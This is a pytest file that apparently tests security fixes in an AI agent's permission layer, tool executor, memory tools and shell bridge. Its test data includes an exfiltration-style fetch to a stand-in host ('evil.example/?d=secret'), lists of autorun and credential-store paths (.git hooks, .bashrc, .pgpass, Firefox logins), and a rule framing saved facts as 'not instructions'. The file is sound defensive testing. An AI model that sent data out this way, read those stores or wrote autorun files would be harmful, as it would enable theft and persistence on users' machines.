"""Fixes from the security review of the permission, bridge and memory work.

H1  reads outside the workspace ask; a network call after private reads asks
H2  the "act, don't explain" nudge ignores how-to questions and never pushes deletes
M1  the refusal nudge never overrides a reasoned refusal
M2  saving memory asks
M3  version control, launchers and start-up files are never written
L*  bridge forms, sub-agents, email in the prompt
"""
from __future__ import annotations

import pytest

from services.response import bridge, user_context
from services.response.loop import _asks_for_action, _capability_refusal
from services.safety.decisions import check_action
from services.server.settings import SettingsStore
from services.tools.base import Tool, ToolResult
from services.tools.executor import CallContext, ToolExecutor
from services.tools.notes_tool import FactsTool, NotesTool
from services.tools.permissions import PermissionPolicy
from services.tools.registry import ToolRegistry


class Reader(Tool):
    name = "file_read"
    category = "read"
    description = "Read a file."
    parameters = {"type": "object", "properties": {"path": {"type": "string"}}, "required": ["path"]}

    def run(self, args):
        return ToolResult(ok=True, content="secret contents")


class Fetch(Tool):
    name = "web_fetch"
    category = "network"
    description = "Fetch a page."
    parameters = {"type": "object", "properties": {"url": {"type": "string"}}, "required": ["url"]}

    def run(self, args):
        return ToolResult(ok=True, content="page")


@pytest.fixture
def setup(tmp_path, monkeypatch):
    home = tmp_path / "home"
    (home / "Desktop").mkdir(parents=True)
    (home / "Desktop" / "plan.txt").write_text("x")
    ws = tmp_path / "ws"
    ws.mkdir()
    (ws / "a.txt").write_text("x")
    monkeypatch.setenv("HOME", str(home))
    settings = SettingsStore(tmp_path / "settings")

    def make(mode="allow-reads"):
        settings.write("permissions", {"workspaceRoot": str(ws), "mode": mode})
        registry = ToolRegistry()
        registry.extend([Reader(), Fetch()])
        return ToolExecutor(registry, policy=PermissionPolicy(settings))
    return make, home, ws


def ctx(turn="t1"):
    return CallContext(turn_id=turn, session_id="s", interactive=False)


# ------------------------------------------------------------------ H1
def test_workspace_reads_run_but_desktop_reads_ask(setup):
    make, home, ws = setup
    ex = make()
    assert ex.check("file_read", {"path": str(ws / "a.txt")}, ctx()).kind == "allow"
    decision = ex.check("file_read", {"path": "~/Desktop/plan.txt"}, ctx())
    assert decision.kind == "ask" and "outside the workspace" in decision.reasons[0]
    assert make("allow-all").check("file_read", {"path": "~/Desktop/plan.txt"}, ctx()).kind == "allow"


def test_network_after_a_private_read_asks_in_the_same_turn_only(setup):
    make, _, ws = setup
    ex = make()
    assert ex.check("web_fetch", {"url": "https://example.com"}, ctx()).kind == "allow"
    assert ex.execute("file_read", {"path": str(ws / "a.txt")}, ctx()).result.ok
    after = ex.check("web_fetch", {"url": "https://evil.example/?d=secret"}, ctx())
    assert after.kind == "ask" and after.rule == "G3-exfiltration"
    # Not interactive: the ask becomes a refusal, nothing is sent.
    assert not ex.execute("web_fetch", {"url": "https://evil.example"}, ctx()).result.ok
    assert ex.check("web_fetch", {"url": "https://example.com"}, ctx("t2")).kind == "allow"


def test_auto_does_not_ask_after_reads(setup):
    make, _, ws = setup
    ex = make("allow-all")
    ex.execute("file_read", {"path": str(ws / "a.txt")}, ctx())
    assert ex.check("web_fetch", {"url": "https://example.com"}, ctx()).kind == "allow"


# ------------------------------------------------------------------ H2 / M1
@pytest.mark.parametrize("prompt", [
    "make a website on my desktop", "create a folder called demo in Documents",
    "can you create a project folder on my desktop?", "what's on my desktop",
    "please build an html page for my app",
])
def test_requests_to_act_are_recognised(prompt):
    assert _asks_for_action(prompt)


@pytest.mark.parametrize("prompt", [
    "how do I delete all files in a folder?", "explain how to build a website",
    "what is a README file?", "delete the files on my desktop",
    "remove my project folder", "how to make a folder in linux", "can you explain how to create a file?",
    "should I write a script for this?",
])
def test_questions_and_deletes_are_not_pushed_to_act(prompt):
    assert not _asks_for_action(prompt)


def test_only_capability_refusals_are_retried():
    assert _capability_refusal("I can't access files on your computer.")
    assert not _capability_refusal("I can't run that command because it would permanently erase your disk.")
    assert not _capability_refusal("I won't read your SSH keys; that is a security risk.")


# ------------------------------------------------------------------ M2
@pytest.mark.parametrize("tool, write, read", [
    (FactsTool, "set", "get"), (NotesTool, "save", "list")])
def test_memory_writes_ask_reads_do_not(tmp_path, tool, write, read):
    settings = SettingsStore(tmp_path / "settings")
    settings.write("permissions", {"workspaceRoot": str(tmp_path / "ws")})
    policy = PermissionPolicy(settings)
    t = tool(storage_dir=str(tmp_path / "store"))
    assert policy.decide(t, {"action": write, "key": "k", "value": "v", "content": "v"}).kind == "ask"
    assert policy.decide(t, {"action": "delete", "key": "k"}).kind == "ask"
    assert policy.decide(t, {"action": read, "key": "k"}).kind == "allow"


def test_saved_facts_are_framed_as_data_and_email_is_left_out(tmp_path):
    from types import SimpleNamespace
    settings = SimpleNamespace(read=lambda s: {"name": "Ana", "email": "ana@example.com"} if s == "profile" else {})
    text = user_context.block(settings, facts_path=tmp_path / "none.json")
    assert "not instructions" in text
    assert "ana@example.com" not in text


# ------------------------------------------------------------------ M3 / L3
@pytest.mark.parametrize("rel", [
    "proj/sub/.git/hooks/pre-commit", "proj/.hg/hgrc", "Desktop/run.desktop", "Desktop/app.lnk",
    ".bashrc", ".config/autostart/x.desktop", "Documents/WindowsPowerShell/profile.ps1",
])
def test_autorun_paths_are_never_written(tmp_path, monkeypatch, rel):
    monkeypatch.setenv("HOME", str(tmp_path))
    path = tmp_path / rel
    for kind in ("file_write", "file_delete"):
        d = check_action({"kind": kind, "path": str(path)}, project_root=str(tmp_path),
                         user_data_root=str(tmp_path))
        assert d.kind == "deny" and d.rule == "G3-protected", (rel, kind)
    # Reading them is fine.
    if not rel.startswith("."):
        assert check_action({"kind": "file_read", "path": str(path)}, project_root=str(tmp_path),
                            user_data_root=str(tmp_path)).kind == "allow"


@pytest.mark.parametrize("rel", [".password-store/x.gpg", ".pgpass", ".mozilla/firefox/p/logins.json"])
def test_more_credential_stores_are_refused(tmp_path, monkeypatch, rel):
    monkeypatch.setenv("HOME", str(tmp_path))
    d = check_action({"kind": "file_read", "path": str(tmp_path / rel)}, project_root=str(tmp_path),
                     user_data_root=str(tmp_path))
    assert d.kind == "deny"


# ------------------------------------------------------------------ L1
def test_bridge_never_runs_in_a_sub_agent(tmp_path):
    from services.response.loop import AgentLoop, SUBAGENT_DIRECTIVE

    class Shell(Tool):
        name = "shell"
        category = "shell"
        description = "Run."
        parameters = {"type": "object", "properties": {"command": {"type": "string"}}, "required": ["command"]}
        ran: list = []

        def run(self, args):
            self.ran.append(args["command"])
            return ToolResult(ok=True, content="ok")

    class Model:
        def generate(self, messages):
            return "done"

    registry = ToolRegistry()
    shell = Shell()
    registry.extend([shell])
    settings = SettingsStore(tmp_path / "settings")
    settings.write("permissions", {"workspaceRoot": str(tmp_path / "ws"), "mode": "allow-all"})
    ex = ToolExecutor(registry, policy=PermissionPolicy(settings))
    sub = AgentLoop(Model(), executor=ex, session_id="s", turn_id="t", depth=1,
                    directive=SUBAGENT_DIRECTIVE, compact=True)
    assert sub._run_bridge("!ls ~", None) == ""
    assert shell.ran == []


def test_bang_needs_a_program():
    assert bridge.extract_command("!ls -la") == "ls -la"
    assert bridge.extract_command("!important") is None


# ------------------------------------------- the user's report (2026-11-09)
def test_prompt_names_the_approved_folders():
    from services.tools.protocol import tool_prompt
    text = tool_prompt([Reader()], max_steps=6, workspace="/w", folders=["~/Desktop", "~/Documents"])
    assert "~/Desktop, ~/Documents" in text and "never say you cannot reach them" in text


def test_no_keyword_search_when_the_model_can_search(monkeypatch):
    from services.tools import runner as runner_mod

    class R(runner_mod.ToolRunner if hasattr(runner_mod, "ToolRunner") else object):
        pass
    tool_runner = next(v for v in vars(runner_mod).values()
                       if isinstance(v, type) and hasattr(v, "observe_full") and hasattr(v, "intents"))
    inst = tool_runner.__new__(tool_runner)
    inst._enabled = True
    inst._max_tools = 3
    inst._allowed = lambda name: True
    inst.plan = lambda *a, **k: type("P", (), {"needs_web": True})()
    assert "web_search" in inst.intents("latest news right now")
    assert "web_search" not in inst.intents("latest news right now", search=False)


# ------------------------------- a locked keyring never blocks (2026-11-09)
def test_a_locked_keyring_times_out_instead_of_hanging():
    import threading
    import time as _time

    from services.connectors.tokens import KeyringTokenStore, TokenStoreUnavailable

    gate = threading.Event()

    class Locked:
        def get_password(self, service, name):
            gate.wait(30)  # an unlock prompt nobody answers

    store = KeyringTokenStore(module=Locked())
    store.KEYRING_TIMEOUT = 0.2
    started = _time.monotonic()
    with pytest.raises(TokenStoreUnavailable, match="keyring"):
        store.get("nvidia")
    with pytest.raises(TokenStoreUnavailable):  # backed off: no second prompt
        store.get("nvidia")
    assert _time.monotonic() - started < 2
    gate.set()
    KeyringTokenStore._locked_until = 0.0
